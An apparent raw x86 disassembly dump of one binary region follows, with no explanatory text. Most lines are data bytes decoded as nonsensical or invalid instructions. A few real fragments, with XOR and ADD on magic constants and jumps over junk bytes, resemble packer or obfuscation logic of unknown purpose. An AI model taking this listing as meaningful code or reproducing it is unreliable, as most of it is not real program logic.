  4020f4:	mov    BYTE PTR [ecx],0x30
  4020f7:	ret    0x5710
  4020fa:	jecxz  0x402093
  4020fc:	xchg   esp,eax
  4020fd:	xchg   esi,eax
  4020fe:	push   cs
  4020ff:	add    eax,0xc0a69991
  402104:	inc    esp
  402105:	mov    edi,DWORD PTR [eax-0x14]
  402108:	out    dx,al
  402109:	add    BYTE PTR [ecx-0x615446a4],bl
  40210f:	loope  0x402126
  402111:	jmp    0x294d:0xb58c60f3
  402118:	mov    DWORD PTR [eax+eiz*1+0xc56a196],edi
  40211f:	int    0xf9
  402121:	add    eax,0x85d23295
  402126:	mov    bl,0xb5
  402128:	push   edi
  402129:	or     ch,BYTE PTR [ecx+0x78]
  40212c:	jecxz  0x4020b0
  40212e:	out    dx,eax
  40212f:	mov    al,ds:0xec43e5e8
  402134:	push   edi
  402135:	fisubr DWORD PTR [ecx-0x1abb6722]
  40213b:	dec    ecx
  40213c:	mov    edx,0x21cc8bf9
  402141:	adc    eax,0x97bd47bd
  402146:	dec    ebp
  402147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402148:	fcomp  QWORD PTR [esi]
  40214a:	mov    edx,0x89ce8d66
  40214f:	fcom   st(4)
  402151:	jns    0x4021a3
  402153:	and    DWORD PTR [eax-0x64f6df68],ebx
  402159:	dec    ebp
  40215a:	pop    es
  40215b:	ret    0x8325
  40215e:	and    BYTE PTR [edx],ch
  402160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402161:	fstp   DWORD PTR [ebp+0x7c]
  402164:	popa   
  402165:	cdq    
  402166:	out    0xd2,eax
  402168:	outs   dx,DWORD PTR ds:[esi]
  402169:	jle    0x4021b0
  40216b:	daa    
  40216c:	pop    ebx
  40216d:	jecxz  0x402152
  40216f:	push   ss
  402170:	sub    eax,0xc754192c
  402175:	mov    ds:0x599f3f1a,eax
  40217a:	enter  0x11cb,0xdf
  40217e:	jmp    0xbf11a8cb
  402183:	push   esi
  402184:	add    dl,BYTE PTR [ecx]
  402186:	rol    BYTE PTR [eax+0x7a],cl
  402189:	push   cs
  40218a:	fidivr DWORD PTR [ebx-0x4d]
  40218d:	add    al,0x70
  40218f:	xlat   BYTE PTR ds:[ebx]
  402190:	push   0x37
  402192:	lods   al,BYTE PTR ds:[esi]
  402193:	lods   al,BYTE PTR ds:[esi]
  402194:	pop    ds
  402195:	or     al,0x86
  402197:	mov    al,cl
  402199:	je     0x40217a
  40219b:	std    
  40219c:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40219e:	mov    ebx,0x5e304c77
  4021a3:	or     al,0x8c
  4021a5:	push   es
  4021a6:	(bad)  
  4021a7:	ins    BYTE PTR es:[edi],dx
  4021a8:	cmp    edx,esi
  4021aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021ab:	xchg   edi,eax
  4021ad:	scas   eax,DWORD PTR es:[edi]
  4021ae:	sub    al,0x3d
  4021b0:	jns    0x40213d
  4021b2:	mov    cl,0x4e
  4021b4:	push   ebp
  4021b5:	fwait
  4021b6:	iret   
  4021b7:	mov    cs,WORD PTR ds:0xfc00a85d
  4021bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021be:	pop    es
  4021bf:	cmp    eax,0xab91a113
  4021c4:	jg     0x4021bc
  4021c6:	enter  0xc020,0x25
  4021ca:	call   0x8e27:0xa31c4656
  4021d1:	inc    edx
  4021d2:	cmp    eax,0x90447ea8
  4021d7:	push   eax
  4021d8:	or     edi,DWORD PTR [eax+0x5af7fc5]
  4021de:	jne    0x402229
  4021e0:	ret    0x7c46
  4021e3:	push   ebx
  4021e4:	(bad)  
  4021e5:	jns    0x402186
  4021e7:	pop    ebx
  4021e8:	test   eax,0x86537709
  4021ed:	je     0x4021f5
  4021ef:	xchg   edi,eax
  4021f0:	xor    dl,al
  4021f2:	int3   
  4021f3:	xchg   esp,eax
  4021f4:	in     eax,0x6e
  4021f6:	sub    cl,ch
  4021f8:	cmp    edi,DWORD PTR [esi-0xa]
  4021fb:	inc    ebx
  4021fc:	xlat   BYTE PTR ds:[ebx]
  4021fd:	xlat   BYTE PTR ds:[ebx]
  4021fe:	xor    BYTE PTR [ebp-0x4],0x7d
  402202:	or     al,0xad
  402204:	jge    0x40220d
  402206:	inc    ebx
  402207:	mov    al,0xa1
  402209:	and    DWORD PTR [ebx],ebx
  40220b:	aas    
  40220c:	add    ch,BYTE PTR [ebp+0x1f2308df]
  402212:	pusha  
  402213:	add    esp,DWORD PTR [ecx-0x6d71391d]
  402219:	test   eax,0x9ed22f03
  40221e:	add    edi,0xa27c0a5e
  402224:	inc    eax
  402225:	push   0xffffffab
  402227:	sub    dl,BYTE PTR [edx-0x17eeb78c]
  40222d:	hlt    
  40222e:	push   es
  40222f:	inc    eax
  402230:	cmp    eax,0xde90cfb9
  402235:	fs leave 
  402237:	fs adc eax,0xf6e1bba0
  40223d:	mov    al,ds:0x9d2deb38
  402243:	xor    eax,0x41bcc9ec
  402248:	call   0xdc15:0x7f65dff7
  40224f:	xchg   edi,eax
  402250:	adc    al,0x83
  402252:	sbb    dl,BYTE PTR [esi+0x2b]
  402255:	xchg   BYTE PTR [esi+eiz*8+0x6676c44],bl
  40225c:	loop   0x40228b
  40225e:	cmp    eax,0x4298bef4
  402263:	stc    
  402264:	shr    BYTE PTR [ecx+0x59e4325c],0x74
  40226b:	dec    edx
  40226c:	jne    0x402296
  40226e:	push   esi
  40226f:	or     al,0xf0
  402271:	sbb    eax,0xd2db92d3
  402276:	je     0x4026fd
  40227c:	mov    eax,DWORD PTR [ebp-0x14]
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    esi,esi
  40229b:	xor    esp,DWORD PTR [eax-0x5b]
  40229e:	jo     0x4022a2
  4022a0:	jo     0x402312
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	push   edi
  4022a7:	ret    
  4022a8:	mov    bl,0x9b
  4022aa:	mov    bh,0x20
  4022ac:	mov    WORD PTR [esi+0x51],?
  4022af:	xchg   edx,eax
  4022b0:	dec    ecx
  4022b1:	sbb    eax,0xa4450970
  4022b6:	xchg   esp,eax
  4022b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022b8:	jmp    0xf731f250
  4022bd:	dec    eax
  4022be:	mov    al,0x7a
  4022c0:	or     eax,0x2607dbbc
  4022c5:	loopne 0x40224e
  4022c7:	mov    bl,0x74
  4022c9:	xor    bh,BYTE PTR [edx-0x4bb3dfb9]
  4022cf:	fwait
  4022d0:	repz hlt 
  4022d2:	leave  
  4022d3:	sbb    ebx,DWORD PTR [edi]
  4022d5:	in     eax,0x43
  4022d7:	rcl    BYTE PTR [edi-0x702bb565],1
  4022dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022de:	sbb    eax,0xd6b342ce
  4022e3:	stos   BYTE PTR es:[edi],al
  4022e4:	fmul   QWORD PTR [edx+0x1a]
  4022e7:	add    ebx,DWORD PTR [esi+eiz*8]
  4022ea:	rcr    ecx,0xc7
  4022ed:	scas   eax,DWORD PTR es:[edi]
  4022ee:	pop    es
  4022ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022f0:	mov    edx,0x531433dc
  4022f5:	xchg   ebp,eax
  4022f6:	mov    bh,0x9a
  4022f8:	jmp    0xd8bf:0xeb33fb00
  4022ff:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  402301:	sbb    esp,0xffffffae
  402304:	dec    edi
  402305:	sub    edi,DWORD PTR [ebx]
  402307:	push   ecx
  402308:	rcr    al,0xd3
  40230b:	nop
  40230c:	cdq    
  40230d:	adc    eax,0xc1cd67bd
  402312:	pop    esp
  402313:	jbe    0x4022da
  402315:	test   al,0x62
  402317:	in     al,0xad
  402319:	stc    
  40231a:	mov    edi,0xf8dd2880
  40231f:	ret    0xdb48
  402322:	outs   dx,BYTE PTR ds:[esi]
  402323:	adc    ebp,ebx
  402325:	popf   
  402326:	add    eax,0xafc36c27
  40232b:	mov    al,0xaa
  40232d:	cmc    
  40232e:	inc    eax
  402330:	pop    esi
  402331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402332:	jmp    0x4022cf
  402334:	bound  edi,QWORD PTR [esi]
  402336:	loopne 0x402365
  402338:	(bad)  
  402339:	(bad)  
  40233a:	mov    ch,0xc0
  40233c:	outs   dx,DWORD PTR ds:[esi]
  40233d:	pop    esi
  40233e:	popa   
  40233f:	fstp   QWORD PTR [ecx]
  402341:	pop    esp
  402342:	bound  eax,QWORD PTR [ebx]
  402344:	pushf  
  402345:	jno    0x40232e
  402347:	mov    bl,0x2b
  402349:	add    dl,BYTE PTR [ebx+ebp*8+0x77025fe9]
  402350:	add    edx,DWORD PTR [edi-0x9]
  402353:	inc    eax
  402354:	jmp    0xeb39:0xfff1fccf
  40235b:	cdq    
  40235c:	loop   0x402381
  40235e:	je     0x4023d2
  402360:	aam    0x7a
  402362:	data16 add al,0x1d
  402365:	adc    al,BYTE PTR [edi+0x6a]
  402368:	add    BYTE PTR [ecx-0x763a514],bh
  40236e:	in     al,dx
  40236f:	in     eax,0x3d
  402371:	pop    edx
  402372:	das    
  402373:	push   eax
  402374:	sahf   
  402375:	inc    ebp
  402376:	add    eax,DWORD PTR [edi]
  402378:	push   cs
  402379:	ror    DWORD PTR [ebp+ebp*4-0x52dc8784],0x1d
  402381:	jmp    0x65cd:0xd87a7c20
  402388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402389:	adc    bl,0xf9
  40238c:	jge    0x4023c9
  40238e:	sub    al,BYTE PTR [ecx]
  402390:	inc    ecx
  402391:	cmp    dl,BYTE PTR [edx-0x3f]
  402394:	push   edx
  402395:	in     eax,0x8b
  402397:	sbb    DWORD PTR [ebx+0x53],ebp
  40239a:	sbb    eax,0x95226b15
  40239f:	sbb    eax,0xd1be348a
  4023a4:	xchg   ebp,eax
  4023a5:	aas    
  4023a6:	jecxz  0x402358
  4023a8:	int3   
  4023a9:	adc    bp,cx
  4023ac:	pop    ebx
  4023ad:	mov    esi,0x6b917b79
  4023b2:	dec    ebp
  4023b3:	jge    0x4023d4
  4023b5:	and    ecx,DWORD PTR [edi-0x7b132edf]
  4023bb:	jb     0x402402
  4023bd:	sbb    dh,0xef
  4023c0:	fs add ebx,esi
  4023c3:	xchg   esi,eax
  4023c4:	or     DWORD PTR [eax],ebx
  4023c6:	xor    BYTE PTR [edi+0x584fd491],0x1a
  4023cd:	mov    ch,0x6d
  4023cf:	pop    esi
  4023d0:	ds jecxz 0x40240f
  4023d3:	push   ds
  4023d4:	add    ebp,DWORD PTR [esi+0x52f3d026]
  4023da:	enter  0xe3a0,0x3a
  4023de:	ret    0x69e9
  4023e1:	dec    edx
  4023e2:	mov    DWORD PTR [ecx],edi
  4023e4:	cmp    DWORD PTR [ebp+ebx*8+0x72],0x57
  4023e9:	adc    edx,eax
  4023eb:	ins    BYTE PTR es:[edi],dx
  4023ec:	pop    es
  4023ed:	test   ah,dl
  4023ef:	(bad)  
  4023f0:	jmp    FWORD PTR [ebp-0x7eb35821]
  4023f6:	fdivr  QWORD PTR [ecx]
  4023f8:	adc    BYTE PTR [esi],0xa2
  4023fb:	mov    esp,0x461f6521
  402400:	das    
  402401:	adc    DWORD PTR [edx],ecx
  402403:	sbb    cl,BYTE PTR [ecx+0xf805624]
  402409:	sub    bl,BYTE PTR ds:0x7725d74a
  40240f:	push   cs
  402410:	adc    cl,0x33
  402413:	(bad)  
  402414:	clc    
  402415:	xor    eax,0xf446260f
  40241a:	repnz xchg ecx,eax
  40241c:	pop    edi
  40241d:	cld    
  40241e:	ds xchg edx,eax
  402420:	pop    esi
  402421:	or     ebp,DWORD PTR [ebp+0x43]
  402424:	xor    BYTE PTR [ebx+edx*4-0x29],dl
  402428:	ret    
  402429:	icebp  
  40242a:	retf   0x7c54
  40242d:	push   eax
  40242e:	sbb    DWORD PTR [ebx],ebx
  402430:	lahf   
  402431:	dec    esp
  402432:	push   esi
  402433:	xor    ebp,DWORD PTR [esi]
  402435:	cmp    DWORD PTR [edx],ebp
  402437:	fdiv   QWORD PTR [eax-0x37241086]
  40243d:	and    ch,BYTE PTR [esi-0x21999f08]
  402443:	push   ss
  402444:	(bad)  
  402445:	stc    
  402446:	lock leave 
  402448:	xchg   edx,eax
  402449:	test   BYTE PTR [eax+0x7d],ah
  40244c:	mov    ah,0x66
  40244e:	add    dl,BYTE PTR [ebx]
  402450:	out    dx,eax
  402451:	sub    ebx,DWORD PTR [edi-0x89125f]
  402457:	aam    0xde
  402459:	gs and eax,0x60969149
  40245f:	das    
  402460:	cmp    eax,0xd4d54fb
  402465:	add    edx,DWORD PTR [ebp+0x2c]
  402468:	ret    
  402469:	(bad)  
  40246a:	dec    edi
  40246b:	jle    0x402428
  40246d:	scas   eax,DWORD PTR es:[edi]
  40246e:	mov    ebx,0x849cbd76
  402473:	aas    
  402474:	mov    ah,0xc2
  402476:	inc    esp
  402477:	fstp   QWORD PTR [ebp+ebp*1-0x4edf66fb]
  40247e:	adc    eax,DWORD PTR [ebp-0x5d]
  402481:	in     al,0x2c
  402483:	mov    esp,0x8f85d177
  402488:	psubsw mm7,mm0
  40248b:	xchg   ebx,eax
  40248c:	repnz mov cs,WORD PTR [edx-0x1f]
  402490:	cmp    DWORD PTR [edx],edi
  402492:	arpl   si,cx
  402494:	mov    eax,ds:0x51cf8f2e
  402499:	(bad)  
  40249a:	push   edi
  40249b:	pop    edx
  40249c:	xchg   edx,eax
  40249d:	sbb    eax,0xf943fd1e
  4024a2:	sbb    al,0x6
  4024a4:	sub    BYTE PTR [ebx+0x66],bl
  4024a7:	mov    edx,DWORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx-0x2fbe0ec9],cl
  4024f4:	and    esi,DWORD PTR [eax+0x0]
  4024f7:	jo     0x402569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	enter  0xa71,0xf2
  402501:	out    0xf1,eax
  402503:	mov    al,ds:0x45d1e636
  402508:	mov    cl,0xb0
  40250a:	repz jg 0x40253e
  40250d:	clc    
  40250e:	xor    DWORD PTR [ecx+0x5bac0b],0x0
  402515:	ret    
  402516:	in     al,0x2e
  402518:	mov    eax,esi
  40251a:	popf   
  40251b:	fwait
  40251c:	lahf   
  40251d:	add    al,0x6c
  40251f:	sbb    edi,DWORD PTR [edx+0x10808cde]
  402525:	xchg   BYTE PTR [edi],bl
  402527:	retf   0xab4
  40252a:	ins    DWORD PTR es:[edi],dx
  40252b:	loopne 0x402558
  40252d:	xchg   ebx,eax
  40252e:	mov    dh,0x59
  402530:	lods   al,BYTE PTR ds:[esi]
  402531:	xchg   edx,eax
  402532:	jb     0x40259c
  402534:	pop    eax
  402535:	sbb    ch,BYTE PTR [esi+0x26]
  402538:	in     eax,0x2d
  40253a:	xor    al,0xf
  40253c:	dec    BYTE PTR [ebx+ecx*4+0x79]
  402540:	pop    ds
  402541:	out    0xfa,eax
  402543:	pop    ecx
  402544:	cmp    ecx,DWORD PTR [eax-0x2091919d]
  40254a:	fnstenv [esi+0x7a628aa1]
  402550:	mov    ebx,0xe95001f4
  402555:	inc    ecx
  402556:	shl    DWORD PTR [eax],0x68
  402559:	add    DWORD PTR [edx-0x4252bf2d],0x616bf114
  402563:	push   ebx
  402564:	sbb    cl,BYTE PTR [eax+0x1f835166]
  40256a:	jnp    0x402582
  40256c:	add    eax,0x75af6998
  402571:	xchg   esp,eax
  402572:	jbe    0x4025d7
  402574:	repnz rol cl,cl
  402577:	rol    BYTE PTR [esi-0x7e],cl
  40257a:	repnz shr DWORD PTR [edi],1
  40257d:	adc    ch,BYTE PTR [ebp-0x4c]
  402580:	loopne 0x402546
  402582:	xor    dl,BYTE PTR [edx-0x6f]
  402585:	sub    BYTE PTR [ebx-0x2a],ch
  402588:	xchg   esp,eax
  402589:	or     edi,ebp
  40258b:	xchg   edi,eax
  40258c:	mov    WORD PTR [edx-0x44],fs
  40258f:	xor    DWORD PTR [ebx-0x466c45e2],esi
  402595:	inc    eax
  402596:	jmp    0x5d5d:0x7a0580da
  40259d:	ins    DWORD PTR es:[edi],dx
  40259e:	pop    ss
  40259f:	je     0x4025a1
  4025a1:	and    eax,0xbda41b3
  4025a6:	pop    ebx
  4025a7:	shr    DWORD PTR [edi+0x53],1
  4025aa:	jb     0x40254f
  4025ac:	loop   0x402572
  4025ae:	dec    ebp
  4025af:	lea    ecx,[ebp-0xfee11cc]
  4025b5:	ds push ebp
  4025b7:	xor    al,0xe3
  4025b9:	iret   
  4025ba:	xor    eax,0xa89e22c3
  4025bf:	jne    0x402629
  4025c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025c2:	(bad)  
  4025c3:	sbb    DWORD PTR [esi],esi
  4025c5:	inc    ebx
  4025c6:	stc    
  4025c7:	pop    eax
  4025c8:	fldcw  WORD PTR [eax+0x5e4a3272]
  4025ce:	dec    edi
  4025cf:	std    
  4025d0:	adc    ch,bh
  4025d2:	data16 jb 0x4025a6
  4025d5:	xchg   ebp,eax
  4025d6:	jge    0x40263c
  4025d8:	pop    es
  4025d9:	xchg   ebx,eax
  4025da:	or     ecx,DWORD PTR [esi]
  4025dc:	ss jbe 0x4025d5
  4025df:	pusha  
  4025e0:	or     al,dh
  4025e2:	fcom   QWORD PTR [edx]
  4025e4:	aad    0x8d
  4025e6:	cli    
  4025e7:	pushf  
  4025e8:	xor    al,0xdd
  4025ea:	inc    esp
  4025eb:	mov    ds:0x8ca208fa,eax
  4025f0:	mov    bh,0x75
  4025f2:	lock outs dx,BYTE PTR ds:[esi]
  4025f4:	fidiv  DWORD PTR [edi+0x55]
  4025f7:	or     BYTE PTR [edi-0x289edde],al
  4025fd:	std    
  4025fe:	in     eax,dx
  4025ff:	cdq    
  402600:	jae    0x4025d1
  402602:	js     0x402633
  402604:	in     eax,0xf1
  402606:	pop    esi
  402607:	xor    DWORD PTR [ebp-0x1e3b4fd5],esp
  40260d:	bound  esi,QWORD PTR [ebp-0x80498d2]
  402613:	fcmovbe st,st(5)
  402615:	cmp    BYTE PTR [eax-0x2985ec5e],0xec
  40261c:	clc    
  40261d:	shl    ch,0x86
  402620:	aam    0x34
  402622:	aas    
  402623:	cmp    BYTE PTR [ebp-0x46ff5b6e],ch
  402629:	jge    0x402628
  40262b:	cmp    DWORD PTR [ecx-0x43],edi
  40262e:	jae    0x402619
  402630:	rcr    BYTE PTR [ecx],1
  402632:	pop    esp
  402633:	in     eax,dx
  402634:	pop    ds
  402635:	movntps XMMWORD PTR [eax+0x24f441ae],xmm6
  40263c:	mov    dh,0x63
  40263e:	xor    eax,0xae2871a7
  402643:	rcr    DWORD PTR [esi-0x62],cl
  402646:	test   al,ah
  402648:	or     BYTE PTR [eax+0xc],0x98
  40264c:	jle    0x4025fe
  40264e:	sbb    DWORD PTR [edi+eiz*2],0x9e5a38b8
  402655:	stc    
  402656:	fs push ecx
  402658:	sub    al,0x3c
  40265a:	jne    0x402604
  40265c:	dec    edi
  40265d:	scas   al,BYTE PTR es:[edi]
  40265e:	adc    ah,BYTE PTR [edi+0x2]
  402661:	push   0xb
  402663:	adc    al,0x8
  402665:	jl     0x40266e
  402667:	retf   
  402668:	nop
  402669:	pop    esi
  40266a:	in     eax,0xce
  40266c:	cld    
  40266d:	xor    al,BYTE PTR [edx]
  40266f:	test   BYTE PTR [ecx+0x17b781c5],ch
  402675:	adc    eax,0x43cd730f
  40267a:	fwait
  40267b:	retf   
  40267c:	or     esi,eax
  40267e:	xchg   edi,eax
  40267f:	sbb    al,BYTE PTR [eax+0x6d1dfcc]
  402685:	fadd   DWORD PTR [esi-0x50c77e86]
  40268b:	sub    DWORD PTR [ebx+esi*8+0x3],ebp
  40268f:	jmp    0x4026c7
  402691:	or     eax,0x52959abe
  402696:	scas   al,BYTE PTR es:[edi]
  402697:	inc    di
  402699:	cmc    
  40269a:	add    bl,BYTE PTR [eax-0x69]
  40269d:	xor    DWORD PTR [eax],0x42
  4026a0:	fdiv   st(7),st
  4026a2:	and    dl,BYTE PTR [ebp-0x48c7c981]
  4026a8:	adc    al,0xd1
  4026aa:	lock xlat BYTE PTR ds:[ebx]
  4026ac:	int    0x6
  4026ae:	pop    ecx
  4026af:	or     al,BYTE PTR [ebp-0x64]
  4026b2:	xor    ch,BYTE PTR [edi+0x32]
  4026b5:	jae    0x40264e
  4026b7:	aaa    
  4026b8:	dec    edx
  4026b9:	cs adc dh,dh
  4026bc:	cmp    BYTE PTR [edi+0x4eba6ccf],bh
  4026c2:	gs xchg ecx,eax
  4026c4:	arpl   WORD PTR [edi-0xf],si
  4026c7:	push   edi
  4026c8:	add    eax,DWORD PTR [ebp-0x268bf7d6]
  4026ce:	sub    eax,0xa77a32b9
  4026d3:	push   ds
  4026d4:	jno    0x402656
  4026d6:	cld    
  4026d7:	or     ch,BYTE PTR [eax-0x271b690f]
  4026dd:	or     eax,0xd3d40dfd
  4026e2:	je     0x402732
  4026e4:	inc    edi
  4026e5:	inc    esp
  4026e6:	xchg   DWORD PTR [edi-0x5e],esp
  4026e9:	push   ds
  4026ea:	sub    ch,BYTE PTR [esi+0x4051cbf1]
  4026f0:	ds arpl bx,sp
  4026f3:	stc    
  4026f4:	lock lods eax,DWORD PTR gs:[esi]
  4026f7:	fs int 0x2d
  4026fa:	addr16 dec esp
  4026fc:	and    al,0x8b
  4026fe:	inc    ebp
  4026ff:	hlt    
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0x8eea7ef2
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	jl     0x402782
  402769:	sub    al,0xac
  40276c:	jnp    0x402765
  40276e:	int3   
  40276f:	mov    ds:0x5c10cd4c,al
  402774:	mov    WORD PTR [ebp+0x36e0d2a3],gs
  40277a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40277b:	mov    al,ds:0x86655f15
  402780:	sar    BYTE PTR [ecx-0x48bf4eed],0x2f
  402787:	iret   
  402788:	test   DWORD PTR [eax-0x2],edi
  40278b:	je     0x402765
  40278d:	push   esi
  40278e:	popa   
  40278f:	mov    edi,esi
  402791:	jo     0x402756
  402793:	mov    esi,0x6d83f910
  402798:	int3   
  402799:	sbb    eax,0x5605d716
  40279e:	add    DWORD PTR [ebx],ebx
  4027a0:	(bad)  
  4027a1:	out    0x76,al
  4027a3:	push   ebp
  4027a4:	popf   
  4027a5:	(bad)  
  4027a6:	icebp  
  4027a7:	jecxz  0x40275e
  4027a9:	fnstcw WORD PTR [ecx-0x60b97a16]
  4027af:	sub    al,0x5a
  4027b1:	stos   DWORD PTR es:[edi],eax
  4027b2:	adc    DWORD PTR [esi+eiz*1-0x15bc9b2a],ecx
  4027b9:	stos   BYTE PTR es:[edi],al
  4027ba:	mov    ds:0xd1c6b44f,eax
  4027bf:	mov    esp,0x4cf15c34
  4027c4:	adc    al,0xf0
  4027c6:	popa   
  4027c7:	inc    esp
  4027c8:	mov    bl,0x42
  4027ca:	jb     0x4027d7
  4027cc:	mov    eax,0x9b53f3a2
  4027d1:	inc    esp
  4027d2:	mov    edi,ds
  4027d4:	stc    
  4027d5:	inc    ebp
  4027d6:	jmp    0x82a:0xb9ef4a93
  4027dd:	xchg   ebp,eax
  4027de:	inc    edi
  4027df:	mov    cl,0x4d
  4027e1:	add    eax,0x30170cc2
  4027e6:	hlt    
  4027e7:	mov    ch,0x2b
  4027e9:	(bad)  
  4027ea:	ins    DWORD PTR es:[di],dx
  4027ec:	add    DWORD PTR [edx+ebp*4+0x38e1621],edx
  4027f3:	jns    0x4027e6
  4027f5:	or     dl,0x13
  4027f8:	cmp    BYTE PTR [esi],bh
  4027fa:	fisttp QWORD PTR [ebp-0x71053297]
  402800:	imul   esi,DWORD PTR [edi-0x3413ac8b],0xd6443dfe
  40280a:	jge    0x402819
  40280c:	dec    ebx
  40280d:	sbb    eax,0xbf4477c3
  402812:	outs   dx,DWORD PTR ds:[esi]
  402813:	sar    DWORD PTR [ebp-0x7d6278a3],1
  402819:	xor    al,0xbd
  40281b:	dec    esi
  40281c:	xchg   DWORD PTR [ebx+0x4928a442],edx
  402822:	lea    edx,[eax+0x13d0ff55]
  402828:	mov    ebp,0x5684723e
  40282d:	xchg   DWORD PTR [ebp+0xa8d2e89],esp
  402833:	cwde   
  402834:	in     eax,dx
  402835:	or     BYTE PTR [ebx+ebx*4-0x24d4563],al
  40283c:	inc    ecx
  40283d:	nop
  40283e:	mov    ebp,0xd44542c7
  402843:	fsubr  QWORD PTR [edi-0x3c19166]
  402849:	add    DWORD PTR [ebx],ecx
  40284b:	mov    eax,ds:0x88975af6
  402850:	(bad)  
  402851:	inc    eax
  402852:	(bad)  
  402853:	fistp  QWORD PTR [eax-0x7f]
  402856:	xchg   eax,esi
  402858:	mov    ds:0xbd03428e,eax
  40285d:	cmp    DWORD PTR [edx],edx
  40285f:	dec    edx
  402860:	out    dx,eax
  402861:	fnstcw WORD PTR [edx+0x38]
  402864:	jl     0x402864
  402866:	mov    eax,ds:0xc795481b
  40286b:	xor    eax,0x891b9113
  402870:	in     eax,dx
  402871:	jno    0x40280d
  402873:	push   edi
  402874:	jl     0x402854
  402876:	adc    DWORD PTR ds:0xdfa2afd6,esi
  40287c:	mov    esi,0x2efc68d7
  402881:	inc    esp
  402882:	neg    BYTE PTR [edx+0x4a]
  402885:	dec    ecx
  402886:	or     eax,0x1148f4bc
  40288b:	push   edi
  40288c:	mov    ch,0xee
  40288e:	cdq    
  40288f:	mov    esi,0x7e88cef0
  402894:	mov    WORD PTR [ebx],fs
  402896:	xor    BYTE PTR [eax],cl
  402898:	push   edx
  402899:	xchg   DWORD PTR [edi+ebx*1+0x65],esi
  40289d:	in     eax,0x4d
  40289f:	pop    ss
  4028a0:	mov    DWORD PTR ds:0x7e48c12b,esp
  4028a6:	mov    WORD PTR [esi+edi*1+0x6e],fs
  4028aa:	mov    BYTE PTR [esi-0x7f],al
  4028ad:	fwait
  4028ae:	or     DWORD PTR [ebx+0x3e3340de],edx
  4028b4:	mov    DWORD PTR [esi],esp
  4028b6:	or     esp,DWORD PTR [edx+0x3f]
  4028b9:	repz sub DWORD PTR [eax-0x11],esi
  4028bd:	(bad)  
  4028be:	popf   
  4028bf:	mov    ah,0x22
  4028c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028c2:	xor    al,BYTE PTR [eax]
  4028c4:	ja     0x4028e1
  4028c6:	inc    ebp
  4028c7:	sub    BYTE PTR [esi+0x344d6161],ah
  4028cd:	dec    ebx
  4028ce:	out    0xff,eax
  4028d0:	xchg   edx,eax
  4028d2:	cmc    
  4028d3:	jge    0x4028bd
  4028d5:	jle    0x4028ad
  4028d7:	mov    edi,0xf38a2d09
  4028dc:	mov    eax,ds:0xe17acba7
  4028e1:	mov    ah,0xdf
  4028e4:	jecxz  0x4028a9
  4028e6:	loop   0x4028cf
  4028e8:	jb     0x4028d5
  4028ea:	sub    eax,0x628892cc
  4028ef:	push   eax
  4028f0:	addr16 inc ecx
  4028f2:	hlt    
  4028f3:	xor    BYTE PTR [esi-0x2fcbb5f6],ah
  4028f9:	shr    DWORD PTR [ebx+0x60],cl
  4028fc:	xchg   ecx,eax
  4028fd:	adc    esp,DWORD PTR [edx+0x10]
  402900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402901:	outs   dx,DWORD PTR ds:[esi]
  402902:	and    ebx,DWORD PTR [esi+0x3a7edc52]
